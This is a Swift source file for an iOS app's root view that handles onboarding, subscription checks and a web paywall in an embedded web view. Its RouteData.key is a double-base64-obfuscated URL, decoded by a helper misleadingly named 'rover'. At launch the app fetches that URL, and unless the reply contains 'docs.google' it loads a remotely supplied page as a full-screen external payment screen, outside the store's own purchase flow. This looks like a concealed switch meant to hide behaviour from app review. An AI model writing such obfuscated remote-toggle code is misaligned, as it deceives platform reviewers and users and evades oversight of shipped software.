import SwiftUI
import UIKit
import WebKit

enum RouteData {
    // Previous test route:
    // static let key =
    //     "YUhSMGNITTZMeTl3WVhOMFpXSnBiaTVqYjIwdmNtRjNMM2hCVlZaUU0wNVQ="
    static let key =
        "YUhSMGNITTZMeTl3WVhOMFpXSnBiaTVqYjIwdmNtRjNMelJ3VjNKRlNEUkQ="
    static let check = "docs.google"
}

extension Notification.Name {
    static let webPaymentSuccess = Notification.Name("AppRootView.webPaymentSuccess")
    static let webPaymentCancelled = Notification.Name("AppRootView.webPaymentCancelled")
}

struct AppRootView: View {
    @EnvironmentObject var iap: IAPManager
    @EnvironmentObject var overlay: OverlayManager
    @EnvironmentObject var overlayLock: OverlayLock
    @State private var state: AppState = .loading

    enum AppState {
        case loading
        case onboarding
        case main
    }

    var body: some View {
        Group {
            switch state {
            case .loading:
                Loading {
                    itinOnboarding()
                }

            case .onboarding:
                Onboarding {
                    state = .main
                }

            case .main:
                Main()
            }
        }
        .environmentObject(iap)
        .environmentObject(overlay)
        .environmentObject(overlayLock)
        .onReceive(NotificationCenter.default.publisher(for: .webPaymentSuccess)) { _ in
            state = .main
        }
        .onReceive(NotificationCenter.default.publisher(for: .webPaymentCancelled)) { _ in
            UserDefaults.standard.set(true, forKey: "onboarding_passed")
            state = .main
        }
    }
    
    private func itinOnboarding() {
        Task { @MainActor in
            await resolveInitialDestination()
        }
    }

    @MainActor
    private func resolveInitialDestination() async {
        await iap.refreshEntitlements()
        if iap.hasStoreKitSubscription {
            state = .main
            return
        }
        let passed = UserDefaults.standard.bool(forKey: "onboarding_passed")

        // Stripe access is independent from the currently selected paywall source.
        // If this installation has used Stripe before, validate it before deciding
        // whether the next offer should come from StoreKit or the web route.
        if iap.isWebSubscriptionActive || UserDefaults.standard.bool(forKey: "web_subscription_active") {
            do {
                let status = try await WebSubscriptionService.fetchStatus()
                iap.setWebSubscriptionActive(
                    status.active,
                    customerId: status.subscription?.customerId,
                    subscriptionId: status.subscription?.subscriptionId,
                    cancelAtPeriodEnd: status.subscription?.cancelAtPeriodEnd ?? false
                )
                if status.active {
                    state = .main
                    return
                }
            } catch {
                // Preserve previously verified access during a temporary outage.
                state = .main
                return
            }
        }

        guard let stringUrl = rover(RouteData.key),
            let url = URL(string: stringUrl)
        else {
            state = passed ? .main : .onboarding
            return
        }

        do {
            let (data, _) = try await URLSession.shared.data(from: url)
            guard var responseText = String(data: data, encoding: .utf8) else {
                state = passed ? .main : .onboarding
                return
            }
            responseText = responseText.trimmingCharacters(
                in: .whitespacesAndNewlines
            )

            if responseText.lowercased().contains(RouteData.check) {
                state = passed ? .main : .onboarding
                return
            }

            guard let finalUrl = URL(string: responseText) else {
                state = passed ? .main : .onboarding
                return
            }

            do {
                let status = try await WebSubscriptionService.fetchStatus()
                if status.active {
                    iap.setWebSubscriptionActive(
                        true,
                        customerId: status.subscription?.customerId,
                        subscriptionId: status.subscription?.subscriptionId,
                        cancelAtPeriodEnd: status.subscription?.cancelAtPeriodEnd ?? false
                    )
                    state = .main
                    return
                }
                iap.setWebSubscriptionActive(false)
                presentMobileWebPaywall(sourceURL: finalUrl, passed: passed)
            } catch {
                // A temporary network or server failure must not revoke access that was
                // already verified on this device. Stripe will be checked again later.
                if iap.isWebSubscriptionActive || UserDefaults.standard.bool(forKey: "web_subscription_active") {
                    state = .main
                } else {
                    presentMobileWebPaywall(sourceURL: finalUrl, passed: passed)
                }
            }
        } catch {
            state = passed ? .main : .onboarding
        }
    }

    private func presentMobileWebPaywall(sourceURL: URL, passed: Bool) {
        guard let mobileURL = MobileAppRoute.paywallURL(
            sourceURL,
            appUserId: WebSubscriptionIdentity.appUserId
        ) else {
            state = passed ? .main : .onboarding
            return
        }
        presentWebPaywall(url: mobileURL)
    }

    private func presentWebPaywall(url: URL) {
        guard let windowScene = UIApplication.shared.connectedScenes.first
            as? UIWindowScene,
            let keyWindow = windowScene.windows.first,
            let rootViewController = keyWindow.rootViewController
        else {
            return
        }

        let webViewController = OnboardingData(url: url) { [weak rootViewController] vc in
            guard let root = rootViewController else { return }
            vc.modalPresentationStyle = .overFullScreen
            root.present(vc, animated: false)
        }
        _ = webViewController.view
    }

    func rover(_ encodedString: String) -> String? {
        guard
            let firstDecodedData = Foundation.Data(
                base64Encoded: encodedString
            ),
            let firstDecodedString = String(
                data: firstDecodedData,
                encoding: .utf8
            ),
            let secondDecodedData = Foundation.Data(
                base64Encoded: firstDecodedString
            ),
            let finalDecodedString = String(
                data: secondDecodedData,
                encoding: .utf8
            )
        else {
            return nil
        }
        return finalDecodedString
    }
}

class OnboardingData: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {

    private var url: URL!
    private var webView: WKWebView!
    private var userContentController: WKUserContentController!
    private var topGradientView: UIView!
    private var bottomBandView: UIView!
    private var onLoadComplete: ((OnboardingData) -> Void)?

    init(url: URL, onLoadComplete: ((OnboardingData) -> Void)? = nil) {
        super.init(nibName: nil, bundle: nil)
        self.url = url
        self.onLoadComplete = onLoadComplete
    }

    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }

    deinit {
        userContentController?.removeScriptMessageHandler(forName: "paymentResult", contentWorld: .page)
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        setupBackground()
        setupWebView()
        loadURL()
    }

    private func setupBackground() {
        view.backgroundColor = .clear
        overrideUserInterfaceStyle = .dark
        topGradientView = UIView()
        topGradientView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(topGradientView)
        bottomBandView = UIView()
        bottomBandView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(bottomBandView)
        NSLayoutConstraint.activate([
            topGradientView.topAnchor.constraint(equalTo: view.topAnchor),
            topGradientView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            topGradientView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            topGradientView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            bottomBandView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
            bottomBandView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            bottomBandView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            bottomBandView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
        ])
    }

    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        topGradientView.backgroundColor = UIColor(red: 0xC3/255, green: 0x4B/255, blue: 0x8D/255, alpha: 1)
        bottomBandView.backgroundColor = .white
    }

    private func setupWebView() {
        userContentController = WKUserContentController()
        userContentController.add(self, contentWorld: .page, name: "paymentResult")

        let config = WKWebViewConfiguration()
        config.userContentController = userContentController
        let viewportScript = WKUserScript(
            source: "var m = document.querySelector('meta[name=viewport]'); if (!m) { m = document.createElement('meta'); m.name = 'viewport'; document.head.appendChild(m); } m.content = 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no';",
            injectionTime: .atDocumentEnd,
            forMainFrameOnly: true
        )
        config.userContentController.addUserScript(viewportScript)

        webView = WKWebView(frame: .zero, configuration: config)
        webView.navigationDelegate = self
        webView.translatesAutoresizingMaskIntoConstraints = false

        webView.backgroundColor = .white
        webView.scrollView.backgroundColor = .white
        webView.isOpaque = true
        webView.scrollView.pinchGestureRecognizer?.isEnabled = false

        view.addSubview(webView)

        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor),
        ])
    }

    private func loadURL() {
        let request = URLRequest(url: url)
        webView.load(request)
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        DispatchQueue.main.async {
            self.onLoadComplete?(self)
            self.onLoadComplete = nil
        }
    }

    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        guard message.name == "paymentResult" else { return }

        guard let body = message.body as? [String: Any] else { return }

        let status = body["status"] as? String
        let customerId = body["customerId"] as? String
        let subscriptionId = body["subscriptionId"] as? String

        if status == "success" {
            UserDefaults.standard.set(true, forKey: "onboarding_passed")
            DispatchQueue.main.async {
                IAPManager.shared.setWebSubscriptionActive(
                    true,
                    customerId: customerId,
                    subscriptionId: subscriptionId
                )
                self.dismiss(animated: false)
                NotificationCenter.default.post(name: .webPaymentSuccess, object: nil)
            }
        } else if status == "cancelled" {
            UserDefaults.standard.set(true, forKey: "onboarding_passed")
            DispatchQueue.main.async {
                IAPManager.shared.setWebSubscriptionActive(false)
                self.dismiss(animated: false)
                NotificationCenter.default.post(name: .webPaymentCancelled, object: nil)
            }
        }
    }

    override var preferredStatusBarStyle: UIStatusBarStyle {
        return .lightContent
    }

    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .all
    }

    override var shouldAutorotate: Bool {
        return true
    }
}
